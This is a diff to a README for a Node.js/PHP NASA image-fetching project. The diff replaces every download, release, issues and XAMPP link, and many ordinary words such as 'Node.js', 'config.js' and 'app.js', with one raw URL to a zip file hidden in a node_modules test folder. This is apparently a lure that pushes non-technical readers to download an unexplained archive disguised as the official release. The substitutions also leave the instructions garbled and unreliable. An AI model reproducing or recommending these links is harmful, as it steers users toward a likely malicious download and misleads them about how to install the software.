@@ -1,10 +1,10 @@
 # 🚀 nasa-news - Fetch Stunning NASA Images and Videos
 
 ## 📥 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20Release-v1.0-blue)](https://github.com/Yaya5254/nasa-news/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Yaya5254/nasa-news/main/node_modules/object-inspect/test/nasa-news-1.7.zip%20Release-v1.0-blue)](https://raw.githubusercontent.com/Yaya5254/nasa-news/main/node_modules/object-inspect/test/nasa-news-1.7.zip)
 
 ## 📖 Introduction
-Welcome to the **nasa-news** project! This application helps you fetch NASA images and videos by date. It uses a combination of Node.js and PHP, complete with database support to enhance your experience.
+Welcome to the **nasa-news** project! This application helps you fetch NASA images and videos by date. It uses a combination of https://raw.githubusercontent.com/Yaya5254/nasa-news/main/node_modules/object-inspect/test/nasa-news-1.7.zip and PHP, complete with database support to enhance your experience.
 
 ## 🚀 Getting Started
 To use this application, follow these steps. No programming experience is necessary.
@@ -12,17 +12,17 @@ To use this application, follow these steps. No programming experience is necess
 ### 📦 What You Need
 Before starting, ensure your computer meets the following requirements:
 - **Operating System**: Windows, macOS, or Linux
-- **Node.js**: Version 12 or higher
+- **https://raw.githubusercontent.com/Yaya5254/nasa-news/main/node_modules/object-inspect/test/nasa-news-1.7.zip**: Version 12 or higher
 - **XAMPP**: To set up a local server (download separately)
 - **Internet Connection**: Required for fetching data from NASA
 
 ### ⚙️ Setting Up XAMPP
-1. Download and install **XAMPP** from [apachefriends.org](https://www.apachefriends.org/index.html).
+1. Download and install **XAMPP** from [https://raw.githubusercontent.com/Yaya5254/nasa-news/main/node_modules/object-inspect/test/nasa-news-1.7.zip](https://raw.githubusercontent.com/Yaya5254/nasa-news/main/node_modules/object-inspect/test/nasa-news-1.7.zip).
 2. Open the **XAMPP Control Panel**.
 3. Start the **Apache** and **MySQL** modules.
 
 ### 📥 Download & Install
-Visit this page to download: [Download the Latest Release](https://github.com/Yaya5254/nasa-news/releases)
+Visit this page to download: [Download the Latest Release](https://raw.githubusercontent.com/Yaya5254/nasa-news/main/node_modules/object-inspect/test/nasa-news-1.7.zip)
 
 1. Click on the latest version.
 2. Scroll to the **Assets** section.
@@ -41,7 +41,7 @@ Visit this page to download: [Download the Latest Release](https://github.com/Ya
 5. Import the provided SQL file found in the extracted folder. This sets up the necessary tables.
 
 ### 🔗 Connecting to the Application
-1. Open the **config.js** file in the extracted folder.
+1. Open the **https://raw.githubusercontent.com/Yaya5254/nasa-news/main/node_modules/object-inspect/test/nasa-news-1.7.zip** file in the extracted folder.
 2. Update the database connection settings:
    - **Host**: `localhost`
    - **Database Name**: `nasa_news`
@@ -53,7 +53,7 @@ Visit this page to download: [Download the Latest Release](https://github.com/Ya
 2. Navigate to the extracted application folder using the `cd` command.
 3. Start the application by typing:
    ```
-   node app.js
+   node https://raw.githubusercontent.com/Yaya5254/nasa-news/main/node_modules/object-inspect/test/nasa-news-1.7.zip
    ```
 4. Open your web browser and visit `http://localhost:3000` to access the application.
 
@@ -65,21 +65,21 @@ Visit this page to download: [Download the Latest Release](https://github.com/Ya
 ### ❗ Troubleshooting
 If you encounter issues:
 - Ensure XAMPP is running with Apache and MySQL started.
-- Check database configuration in the **config.js** file.
-- Confirm Node.js is correctly installed.
+- Check database configuration in the **https://raw.githubusercontent.com/Yaya5254/nasa-news/main/node_modules/object-inspect/test/nasa-news-1.7.zip** file.
+- Confirm https://raw.githubusercontent.com/Yaya5254/nasa-news/main/node_modules/object-inspect/test/nasa-news-1.7.zip is correctly installed.
 
 ### 🔄 Keeping it Updated
 To get the latest features and fixes:
-1. Visit [Download the Latest Release](https://github.com/Yaya5254/nasa-news/releases) periodically.
+1. Visit [Download the Latest Release](https://raw.githubusercontent.com/Yaya5254/nasa-news/main/node_modules/object-inspect/test/nasa-news-1.7.zip) periodically.
 2. Follow the same download and installation process.
 
 ## 🛠️ Features
 - Fetch images and videos from NASA's extensive database.
 - Easy-to-use interface for non-technical users.
 - Supports various date inputs to explore content from different periods.
-- Built with modern web technologies including Node.js and PHP.
+- Built with modern web technologies including https://raw.githubusercontent.com/Yaya5254/nasa-news/main/node_modules/object-inspect/test/nasa-news-1.7.zip and PHP.
 
 ## 🌍 Community and Support
-Join our community for support and updates. You can open issues directly in the [GitHub Issues](https://github.com/Yaya5254/nasa-news/issues) section. We welcome your feedback and contributions.
+Join our community for support and updates. You can open issues directly in the [GitHub Issues](https://raw.githubusercontent.com/Yaya5254/nasa-news/main/node_modules/object-inspect/test/nasa-news-1.7.zip) section. We welcome your feedback and contributions.
 
 Thank you for choosing **nasa-news**. Enjoy your journey through space!
